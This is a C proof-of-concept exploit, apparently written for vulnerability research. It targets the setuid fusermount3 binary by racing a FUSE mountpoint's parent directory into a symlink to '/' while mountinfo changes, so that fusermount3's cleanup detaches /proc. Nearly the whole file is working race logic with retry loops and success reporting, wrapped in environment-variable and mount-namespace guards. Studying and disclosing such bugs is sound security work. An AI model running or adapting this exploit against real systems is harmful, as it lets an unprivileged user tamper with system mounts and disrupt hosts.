/*
 * End-to-end fusermount3 chain probe.
 *
 * This invokes the real /usr/bin/fusermount3 with an inherited unconnected
 * _FUSE_COMMFD, watches /proc/self/mountinfo for the FUSE mount event, races
 * the mountpoint parent to a symlink to "/", and checks whether /proc was
 * actually detached by fusermount3's cleanup path.
 *
 * Guardrails:
 * - requires POC_ALLOW_REAL_FUSERMOUNT=mount-namespace-only
 * - requires POC_PARENT_MNT_NS and refuses to run in that namespace
 * - requires non-root real uid, so setuid fusermount3 is exercised
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef PATH_MAX
#define PATH_MAX 4096
#endif

#define MAX_ATTEMPTS 30

static long long usec_since(const struct timespec *start)
{
	struct timespec now;

	clock_gettime(CLOCK_MONOTONIC, &now);
	return (now.tv_sec - start->tv_sec) * 1000000LL +
	       (now.tv_nsec - start->tv_nsec) / 1000LL;
}

static int read_ns_link(const char *path, char *buf, size_t size)
{
	ssize_t len = readlink(path, buf, size - 1);

	if (len < 0)
		return -1;
	buf[len] = '\0';
	return 0;
}

static void guard_or_die(void)
{
	const char *allow = getenv("POC_ALLOW_REAL_FUSERMOUNT");
	const char *parent_ns = getenv("POC_PARENT_MNT_NS");
	char self_ns[128];

	if (allow == NULL || strcmp(allow, "mount-namespace-only") != 0) {
		fprintf(stderr, "[guard] missing POC_ALLOW_REAL_FUSERMOUNT=mount-namespace-only\n");
		exit(2);
	}

	if (parent_ns == NULL || parent_ns[0] == '\0') {
		fprintf(stderr, "[guard] missing POC_PARENT_MNT_NS\n");
		exit(2);
	}

	if (read_ns_link("/proc/self/ns/mnt", self_ns, sizeof(self_ns)) != 0) {
		perror("[guard] readlink /proc/self/ns/mnt");
		exit(2);
	}

	if (strcmp(parent_ns, self_ns) == 0) {
		fprintf(stderr, "[guard] refusing: current mount namespace matches parent (%s)\n",
			self_ns);
		exit(2);
	}

	if (getuid() == 0) {
		fprintf(stderr, "[guard] refusing: probe must run as non-root to exercise setuid fusermount3\n");
		exit(2);
	}

	printf("[guard] parent mount namespace: %s\n", parent_ns);
	printf("[guard] probe mount namespace:  %s\n", self_ns);
	printf("[guard] uid=%ld euid=%ld\n", (long)getuid(), (long)geteuid());
}

static int mkdir_checked(const char *path, mode_t mode)
{
	if (mkdir(path, mode) == 0)
		return 0;
	if (errno == EEXIST)
		return 0;
	fprintf(stderr, "[setup] mkdir %s failed: %s\n", path, strerror(errno));
	return -1;
}

static int setup_paths(char *root, size_t root_sz, char *base, size_t base_sz,
		       char *target, size_t target_sz, char *moved, size_t moved_sz)
{
	char tmpl[] = "/tmp/fusermount-real-chain.XXXXXX";
	char *dir = mkdtemp(tmpl);

	if (dir == NULL) {
		perror("[setup] mkdtemp");
		return -1;
	}

	snprintf(root, root_sz, "%s", dir);
	snprintf(base, base_sz, "%s/x", root);
	snprintf(target, target_sz, "%s/proc", base);
	snprintf(moved, moved_sz, "%s_moved", base);

	if (mkdir_checked(base, 0700) != 0 || mkdir_checked(target, 0700) != 0)
		return -1;

	return 0;
}

static void cleanup_paths(const char *root, const char *base, const char *target,
			  const char *moved)
{
	struct stat st;

	if (lstat(base, &st) == 0 && S_ISLNK(st.st_mode))
		unlink(base);

	rename(moved, base);
	rmdir(target);
	rmdir(base);
	rmdir(moved);
	rmdir(root);
}

static int create_comm_socket(void)
{
	int fd = socket(AF_UNIX, SOCK_DGRAM, 0);
	int flags;

	if (fd < 0) {
		perror("[setup] socket");
		return -1;
	}

	flags = fcntl(fd, F_GETFD);
	if (flags < 0 || fcntl(fd, F_SETFD, flags & ~FD_CLOEXEC) != 0) {
		perror("[setup] clear FD_CLOEXEC");
		close(fd);
		return -1;
	}

	return fd;
}

static int watch_mountinfo(void)
{
	int fd = inotify_init1(IN_CLOEXEC);

	if (fd < 0) {
		perror("[race] inotify_init1");
		return -1;
	}

	if (inotify_add_watch(fd, "/proc/self/mountinfo", IN_MODIFY) < 0) {
		perror("[race] inotify_add_watch mountinfo");
		close(fd);
		return -1;
	}

	return fd;
}

static int proc_is_gone(void)
{
	struct stat st;

	return stat("/proc/self/status", &st) != 0;
}

static int attempt_chain(int attempt)
{
	char root[PATH_MAX], base[PATH_MAX], target[PATH_MAX], moved[PATH_MAX];
	char fd_env[64];
	char event_buf[4096];
	struct pollfd pfd;
	struct timespec start;
	pid_t child;
	int comm_fd = -1, ino_fd = -1;
	int status = 0;
	int saw_event = 0;
	long long event_us = -1, swap_us = -1, exit_us = -1;

	if (setup_paths(root, sizeof(root), base, sizeof(base), target,
			sizeof(target), moved, sizeof(moved)) != 0)
		return -1;

	comm_fd = create_comm_socket();
	ino_fd = watch_mountinfo();
	if (comm_fd < 0 || ino_fd < 0) {
		cleanup_paths(root, base, target, moved);
		if (comm_fd >= 0)
			close(comm_fd);
		if (ino_fd >= 0)
			close(ino_fd);
		return -1;
	}

	printf("[attempt %d] target=%s\n", attempt, target);
	clock_gettime(CLOCK_MONOTONIC, &start);

	child = fork();
	if (child < 0) {
		perror("[attempt] fork");
		cleanup_paths(root, base, target, moved);
		close(comm_fd);
		close(ino_fd);
		return -1;
	}

	if (child == 0) {
		snprintf(fd_env, sizeof(fd_env), "_FUSE_COMMFD=%d", comm_fd);
		putenv(fd_env);
		execl("/usr/bin/fusermount3", "fusermount3", target, (char *)NULL);
		perror("[child] execl fusermount3");
		_exit(127);
	}

	pfd.fd = ino_fd;
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 5000) > 0 && (pfd.revents & POLLIN)) {
		(void)read(ino_fd, event_buf, sizeof(event_buf));
		saw_event = 1;
		event_us = usec_since(&start);
		if (rename(base, moved) == 0 && symlink("/", base) == 0) {
			swap_us = usec_since(&start);
			printf("[attempt %d] mountinfo event at %lld us; swap completed at %lld us\n",
			       attempt, event_us, swap_us);
		} else {
			printf("[attempt %d] swap failed after event: %s\n",
			       attempt, strerror(errno));
		}
	} else {
		printf("[attempt %d] no mountinfo event before timeout\n", attempt);
	}

	waitpid(child, &status, 0);
	exit_us = usec_since(&start);
	printf("[attempt %d] fusermount3 exited after %lld us with status=%d\n",
	       attempt, exit_us, status);

	close(comm_fd);
	close(ino_fd);

	if (saw_event && proc_is_gone()) {
		printf("[attempt %d] SUCCESS: /proc is inaccessible after real fusermount3 cleanup\n",
		       attempt);
		return 0;
	}

	cleanup_paths(root, base, target, moved);
	return 1;
}

int main(void)
{
	int attempt;

	guard_or_die();

	if (access("/usr/bin/fusermount3", X_OK) != 0) {
		perror("[setup] /usr/bin/fusermount3");
		return 1;
	}

	for (attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
		int res = attempt_chain(attempt);

		if (res == 0) {
			printf("[result] real_fusermount3_chain=success\n");
			return 0;
		}
	}

	printf("[result] real_fusermount3_chain=not_proven_after_%d_attempts\n",
	       MAX_ATTEMPTS);
	return 1;
}
